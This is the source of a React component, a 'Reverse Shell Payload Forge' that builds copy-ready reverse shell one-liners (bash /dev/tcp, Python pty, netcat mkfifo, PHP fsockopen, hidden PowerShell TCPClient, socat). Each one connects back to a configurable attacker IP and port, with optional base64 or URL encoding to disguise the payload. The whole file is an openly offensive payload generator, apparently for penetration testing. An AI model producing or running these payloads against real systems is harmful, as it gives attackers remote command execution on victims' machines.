import React, { useState } from 'react';
import { Terminal, Copy, Check, Zap, Sparkles } from 'lucide-react';

export const ReverseShellForge: React.FC = () => {
  const [ip, setIp] = useState('192.168.56.101');
  const [port, setPort] = useState('4444');
  const [shellType, setShellType] = useState<'bash' | 'python3' | 'nc' | 'php' | 'powershell' | 'socat'>('bash');
  const [encoding, setEncoding] = useState<'raw' | 'base64' | 'url'>('raw');
  const [copied, setCopied] = useState(false);

  const getRawPayload = (): string => {
    switch (shellType) {
      case 'bash':
        return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
      case 'python3':
        return `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;
      case 'nc':
        return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
      case 'php':
        return `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
      case 'powershell':
        return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      case 'socat':
        return `socat tcp-connect:${ip}:${port} exec:"bash -li",pty,stderr,setsid,sigint,sane`;
      default:
        return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
    }
  };

  const getPayload = (): string => {
    const raw = getRawPayload();
    if (encoding === 'base64') {
      const b64 = btoa(raw);
      if (shellType === 'powershell') {
        return `powershell -e ${btoa(raw.split('').map(c => c + '\0').join(''))}`;
      }
      return `echo "${b64}" | base64 -d | bash`;
    }
    if (encoding === 'url') {
      return encodeURIComponent(raw);
    }
    return raw;
  };

  const payload = getPayload();

  const handleCopy = () => {
    navigator.clipboard.writeText(payload);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="p-6 rounded-2xl bg-neutral-950 border border-neutral-800 space-y-5">
      <div className="flex flex-wrap items-center justify-between gap-3 border-b border-neutral-800 pb-4">
        <div>
          <div className="flex items-center gap-2">
            <Zap className="w-4 h-4 text-emerald-400" />
            <span className="text-xs font-mono font-bold text-emerald-400 uppercase tracking-wider">
              Reverse Shell Payload Forge
            </span>
          </div>
          <h3 className="text-base font-bold text-neutral-100 mt-0.5">
            Instant One-Liner Weaponizer
          </h3>
        </div>

        <button
          onClick={handleCopy}
          className="px-4 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-semibold text-xs font-mono flex items-center gap-1.5 transition-colors shadow-md shadow-emerald-600/20"
        >
          {copied ? <Check className="w-3.5 h-3.5 text-white" /> : <Copy className="w-3.5 h-3.5" />}
          <span>{copied ? 'Copied Payload!' : 'Copy Payload'}</span>
        </button>
      </div>

      {/* Inputs */}
      <div className="grid grid-cols-1 sm:grid-cols-4 gap-3 text-xs">
        <div>
          <label className="text-[11px] font-mono text-neutral-400 block mb-1">
            Attacker IP (LHOST)
          </label>
          <input
            type="text"
            value={ip}
            onChange={(e) => setIp(e.target.value)}
            className="w-full bg-neutral-900 border border-neutral-800 rounded-lg px-3 py-1.5 font-mono text-emerald-300 focus:outline-none focus:border-emerald-500"
          />
        </div>

        <div>
          <label className="text-[11px] font-mono text-neutral-400 block mb-1">
            Listener Port (LPORT)
          </label>
          <input
            type="text"
            value={port}
            onChange={(e) => setPort(e.target.value)}
            className="w-full bg-neutral-900 border border-neutral-800 rounded-lg px-3 py-1.5 font-mono text-emerald-300 focus:outline-none focus:border-emerald-500"
          />
        </div>

        <div>
          <label className="text-[11px] font-mono text-neutral-400 block mb-1">Language / Tool</label>
          <select
            value={shellType}
            onChange={(e) => setShellType(e.target.value as any)}
            className="w-full bg-neutral-900 border border-neutral-800 rounded-lg px-2.5 py-1.5 font-mono text-neutral-200 focus:outline-none focus:border-emerald-500"
          >
            <option value="bash">Bash (-i)</option>
            <option value="python3">Python 3 (pty.spawn)</option>
            <option value="nc">Netcat (mkfifo)</option>
            <option value="php">PHP (fsockopen)</option>
            <option value="powershell">PowerShell (TCPClient)</option>
            <option value="socat">Socat (PTY)</option>
          </select>
        </div>

        <div>
          <label className="text-[11px] font-mono text-neutral-400 block mb-1">Encoding</label>
          <select
            value={encoding}
            onChange={(e) => setEncoding(e.target.value as any)}
            className="w-full bg-neutral-900 border border-neutral-800 rounded-lg px-2.5 py-1.5 font-mono text-neutral-200 focus:outline-none focus:border-emerald-500"
          >
            <option value="raw">Raw</option>
            <option value="base64">Base64 Encoded</option>
            <option value="url">URL Encoded</option>
          </select>
        </div>
      </div>

      {/* Generated Code Area */}
      <div className="rounded-xl bg-[#090b10] border border-neutral-800 overflow-hidden">
        <div className="flex items-center justify-between px-4 py-2 bg-neutral-900/90 border-b border-neutral-800 text-xs font-mono text-neutral-400">
          <span>Generated {shellType} One-Liner</span>
          <span>Netcat Catcher: nc -lvnp {port}</span>
        </div>
        <pre className="p-4 font-mono text-xs text-emerald-400 overflow-x-auto whitespace-pre-wrap break-all leading-relaxed select-all">
          {payload}
        </pre>
      </div>
    </div>
  );
};
